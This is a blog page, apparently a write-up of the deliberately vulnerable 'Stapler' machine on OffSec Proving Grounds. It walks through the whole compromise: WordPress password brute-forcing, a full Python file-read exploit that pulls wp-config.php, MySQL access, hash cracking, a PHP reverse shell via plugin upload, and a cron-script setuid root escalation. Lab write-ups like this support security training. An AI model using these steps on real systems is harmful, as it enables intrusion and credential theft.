@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: Stapler</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: Stapler | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: Stapler" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/10/02/Proving_grounds_Play-Stapler.html" />
+<meta property="og:url" content="http://localhost:4000/2023/10/02/Proving_grounds_Play-Stapler.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-02T02:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: Stapler" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-10-02T02:00:00+05:30","datePublished":"2023-10-02T02:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: Stapler","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/10/02/Proving_grounds_Play-Stapler.html"},"url":"http://localhost:4000/2023/10/02/Proving_grounds_Play-Stapler.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/10/02/Proving_grounds_Play-Stapler.html">
+    <h2 class="post-title">Proving grounds Play: Stapler</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Oct 2, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+53/tcp    open  tcpwrapped
+80/tcp    open  http        PHP cli server 5.5 or later
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: 404 Not Found
+139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+666/tcp   open  doom?
+3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.12-0ubuntu1
+|   Thread ID: 9
+|   Capabilities flags: 63487
+|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolOld, LongColumnFlag, ConnectWithDatabase, InteractiveClient, SupportsLoadDataLocal, SupportsCompression, ODBCClient, FoundRows, LongPassword, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
+12380/tcp open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Tim, we need to-do better next year <span class="k">for </span>Initech
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="21tcp---open--ftp---vsftpd-208-or-later">21/tcp - open  ftp - vsftpd 2.0.8 or later</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             107 Jun 03  2016 note
+</code></pre></div></div>
+
+<p>Nothing but a note.</p>
+
+<h2 id="80tcp---open--http---php-cli-server-55-or-later">80/tcp - open  http - PHP cli server 5.5 or later</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[21:55:29] 200 -  220B  - /.bash_logout
+[21:55:29] 200 -    4KB - /.bashrc
+[21:55:43] 200 -  675B  - /.profile
+</code></pre></div></div>
+
+<p>Nothing but few files.</p>
+
+<h2 id="139tcp---open---netbios-ssn-samba-smbd-439-ubuntu-workgroup-workgroup">139/tcp - open - netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	print<span class="nv">$ </span>         Disk      Printer Drivers
+	kathy           Disk      Fred, What are we doing here?
+	tmp             Disk      All temporary files should be stored here
+	IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>red server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+</code></pre></div></div>
+
+<p>SMB shares.</p>
+
+<h2 id="12380tcp---open--http---apache-httpd-2418-ubuntu">12380/tcp - open  http - Apache httpd 2.4.18 ((Ubuntu))</h2>
+
+<p>HTTP - http://192.168.211.148:12380/
+HTTPS - https://192.168.211.148:12380/</p>
+
+<h3 id="http-http19216821114812380">HTTP: http://192.168.211.148:12380/</h3>
+
+<p>No directories, anything.</p>
+
+<h3 id="https---https19216821114812380">HTTPS - https://192.168.211.148:12380/</h3>
+
+<p>https://192.168.211.148:12380/robots.txt</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-agent: *
+Disallow: /admin112233/
+Disallow: /blogblog/
+</code></pre></div></div>
+
+<p><strong>Wordpress:</strong> https://192.168.211.148:12380/blogblog/</p>
+
+<h2 id="wpscan">WPScan</h2>
+
+<p>Perform wpscan to enumerate themes, plugins and users.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> &lt;URL&gt; <span class="nt">--enumerate</span> p <span class="nt">--enumerate</span> t <span class="nt">--enumerate</span> u
+</code></pre></div></div>
+
+<h2 id="brute-force-wordpress-credentials">Brute Force wordpress credentials</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> https://192.168.211.148:12380/blogblog/ <span class="nt">--disable-tls-checks</span> <span class="nt">-P</span> /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
+</code></pre></div></div>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>garry:footbal
+harry:monkey
+scott:cookie  
+</code></pre></div></div>
+
+<p>Unfortunately none of the above users are administrators, we need admin account to get initial foothold.</p>
+
+<h2 id="more-recon">More Recon</h2>
+
+<p>https://192.168.208.148:12380/blogblog/wp-content/</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Stapler/content.png" alt="img" /></p>
+
+<p>The plugin advanced-video-embed is vulnerable to <a href="https://www.exploit-db.com/exploits/39646">WordPress Plugin Advanced Video 1.0 - Local File Inclusion</a>.</p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>Use the below exploit code, the one in the above throws ssl error due to the target website configuration.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="c1"># Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation
+# Google Dork: N/A
+# Date: 04/01/2016
+# Exploit Author: evait security GmbH
+# Vendor Homepage: arshmultani - http://dscom.it/
+# Software Link: https://wordpress.org/plugins/advanced-video-embed-embed-videos-or-playlists/
+# Version: 1.0
+# Tested on: Linux Apache / Wordpress 4.2.2
+</span>
+<span class="c1"># POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=[FILEPATH]
+</span>
+<span class="c1"># Exploit - Print the content of wp-config.php in terminal (default Wordpress config)
+</span>
+<span class="kn">import</span> <span class="n">random</span>
+<span class="kn">import</span> <span class="n">urllib2</span>
+<span class="kn">import</span> <span class="n">re</span>
+<span class="kn">import</span> <span class="n">ssl</span>
+
+<span class="n">ssl</span><span class="p">.</span><span class="n">_create_default_https_context</span> <span class="o">=</span> <span class="n">ssl</span><span class="p">.</span><span class="n">_create_unverified_context</span>
+<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://192.168.211.148:12380/blogblog</span><span class="sh">"</span> <span class="c1"># insert url to wordpress
+</span>
+<span class="n">randomID</span> <span class="o">=</span> <span class="nf">long</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span> <span class="o">*</span> <span class="il">100000000000000000L</span><span class="p">)</span>
+
+<span class="n">objHtml</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="nf">urlopen</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">randomID</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">content</span> <span class="o">=</span>  <span class="n">objHtml</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
+	<span class="n">numbers</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">\d+</span><span class="sh">'</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
+	<span class="nb">id</span> <span class="o">=</span> <span class="n">numbers</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+	<span class="nb">id</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10</span>
+
+<span class="n">objHtml</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="nf">urlopen</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/?p=</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+<span class="n">content</span> <span class="o">=</span> <span class="n">objHtml</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
+	<span class="k">if</span> <span class="sh">'</span><span class="s">attachment-post-thumbnail size-post-thumbnail wp-post-image</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+		<span class="n">urls</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sh">'"</span><span class="s">(https?://.*?)</span><span class="sh">"'</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
+		<span class="k">print</span> <span class="n">urllib2</span><span class="p">.</span><span class="nf">urlopen</span><span class="p">(</span><span class="n">urls</span><span class="p">[</span><span class="mi">0</span><span class="p">]).</span><span class="nf">read</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Add the url as per the target page and run the python code. Upon successfull running of the exploit direct to <a href="https://192.168.208.148:12380/blogblog/wp-content/uploads/">https://192.168.208.148:12380/blogblog/wp-content/uploads/</a> URL and find there is a image file located.</p>
+
+<p>Download the image and use grep to search for string <code class="language-plaintext highlighter-rouge">password</code>. The exploit extracts the <code class="language-plaintext highlighter-rouge">wp-config.php</code> file contents as images file.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>define('DB_USER', 'root');
+define('DB_PASSWORD', 'plbkac')
+</code></pre></div></div>
+
+<p>Login to sql server using the credentials and extract wordpress username and hash of an administrative user.</p>
+
+<h2 id="3306tcp---open--mysql---mysql-5712-0ubuntu1">3306/tcp - open  mysql - MySQL 5.7.12-0ubuntu1</h2>
+
+<p>Login the to sql server using the above extracted credentials.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|01:27|~/proving_grounds/Stapler/files/img<span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-pplbkac</span> <span class="nt">-h</span> 192.168.208.148
+Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MySQL connection <span class="nb">id </span>is 9
+Server version: 5.7.12-0ubuntu1 <span class="o">(</span>Ubuntu<span class="o">)</span>
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+MySQL <span class="o">[(</span>none<span class="o">)]&gt;</span> show databases<span class="p">;</span>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| loot               |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
+| proof              |
+| sys                |
+| wordpress          |
++--------------------+
+8 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.226 sec<span class="o">)</span>
+
+MySQL <span class="o">[(</span>none<span class="o">)]&gt;</span> use wordpress
+Reading table information <span class="k">for </span>completion of table and column names
+You can turn off this feature to get a quicker startup with <span class="nt">-A</span>
+
+Database changed
+MySQL <span class="o">[</span>wordpress]&gt; show tables<span class="p">;</span>
++-----------------------+
+| Tables_in_wordpress   |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+11 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.199 sec<span class="o">)</span>
+
+MySQL <span class="o">[</span>wordpress]&gt; <span class="k">select</span> <span class="k">*</span> from wp_users<span class="p">;</span>
+16 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.192 sec<span class="o">)</span>
+
+MySQL <span class="o">[</span>wordpress]&gt; 
+</code></pre></div></div>
+
+<p>Extract the hash of the user <code class="language-plaintext highlighter-rouge">john:$P$B7889EMq/erHIuZapMB8GEizebcIy9.</code> who is a administrative user.</p>
+
+<p>Use john to crack the hash.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|23:22|~/proving_grounds/Stapler/files<span class="nv">$ </span>john <span class="nb">hash</span> <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>phpass <span class="o">[</span>phpass <span class="o">(</span><span class="nv">$P$ </span>or <span class="nv">$H$)</span> 128/128 AVX 4x3]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 8192 <span class="k">for </span>all loaded hashes
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+incorrect        <span class="o">(</span>?<span class="o">)</span>     
+1g 0:00:00:09 DONE <span class="o">(</span>2023-10-01 23:22<span class="o">)</span> 0.1028g/s 19022p/s 19022c/s 19022C/s ireland4..iloveaj2
+Use the <span class="s2">"--show --format=phpass"</span> options to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<p>Now login to worpress https://192.168.208.148:12380/blogblog/wp-login.php using credentials <code class="language-plaintext highlighter-rouge">john:incorrect</code>.</p>
+
+<p>Direct to Plugins ➡️ Add New ➡️ Upload Plugin .</p>
+
+<p>Download pentest monkey PHP reverse shell and make changes accordingly and select the file to upload and Click Install Now.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Stapler/upload.png" alt="img" /></p>
+
+<p>Once it’s uploaded direct to https://192.168.208.148:12380/blogblog/wp-content/uploads/ and trigger the reverse shell.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|01:34|~/proving_grounds/Stapler<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>192.168.45.193] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.208.148] 51462
+Linux red.initech 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux</span>
+ 06:34:44 up 32 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.01, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1408<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@red:/<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p><strong>Initial Foothold Obtained</strong></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="cronjobs">Cronjobs</h3>
+
+<p>Check all cronjobs in the machine.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@red:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lsaht</span> /etc/cron.<span class="k">*</span>
+<span class="nb">ls</span> <span class="nt">-lsaht</span> /etc/cron.<span class="k">*</span>
+/etc/cron.d:
+total 32K
+ 12K drwxr-xr-x 100 root root  12K Jun  9  2021 ..
+4.0K drwxr-xr-x   2 root root 4.0K Jun  3  2016 <span class="nb">.</span>
+4.0K <span class="nt">-rw-r--r--</span>   1 root root   56 Jun  3  2016 logrotate
+4.0K <span class="nt">-rw-r--r--</span>   1 root root  102 Jun  3  2016 .placeholder
+4.0K <span class="nt">-rw-r--r--</span>   1 root root  670 Mar  1  2016 php
+4.0K <span class="nt">-rw-r--r--</span>   1 root root  589 Jul 16  2014 mdadm
+</code></pre></div></div>
+
+<p>Contents of <code class="language-plaintext highlighter-rouge">logrotate</code> file.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@red:/etc/cron.d<span class="nv">$ </span><span class="nb">cat </span>logrotate
+<span class="nb">cat </span>logrotate
+<span class="k">*</span>/5 <span class="k">*</span>   <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root  /usr/local/sbin/cron-logrotate.sh
+www-data@red:/etc/cron.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /usr/local/sbin/cron-logrotate.sh
+<span class="nb">ls</span> <span class="nt">-al</span> /usr/local/sbin/cron-logrotate.sh
+<span class="nt">-rwxrwxrwx</span> 1 root root 51 Jun  3  2016 /usr/local/sbin/cron-logrotate.sh
+www-data@red:/etc/cron.d<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>And the file permission says we can write to it. Write the below exploit to the <code class="language-plaintext highlighter-rouge">cron-logrotate.sh</code>.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@red:/usr/local/sbin<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"cp /bin/dash /tmp/dash; chmod u+s /tmp/dash;"</span> <span class="o">&gt;</span> /usr/local/sbin/cron-logrotate.sh
+&lt;/dash<span class="p">;</span> <span class="nb">chmod </span>u+s /tmp/dash<span class="p">;</span><span class="s2">" &gt; /usr/local/sbin/cron-logrotate.sh 
+</span></code></pre></div></div>
+
+<p>So when the cron job run the script as root user the binry <code class="language-plaintext highlighter-rouge">dash</code> will be copied to the <code class="language-plaintext highlighter-rouge">/tmp</code> folder and <code class="language-plaintext highlighter-rouge">u+s</code> permissions are applied. So then we can run the binary as the owner which is root and that will give us root shell.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@red:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
+<span class="nt">-rwsr-xr-x</span>  1 root root 173644 Oct  2 06:40 dash
+</code></pre></div></div>
+
+<p>The exploit worked and run the binary as follows to obtain root.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@red:/tmp<span class="nv">$ </span>./dash <span class="nt">-p</span>
+./dash <span class="nt">-p</span>
+<span class="nb">whoami
+</span>root
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+bash-4.3<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p><strong>Root Obtained</strong></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
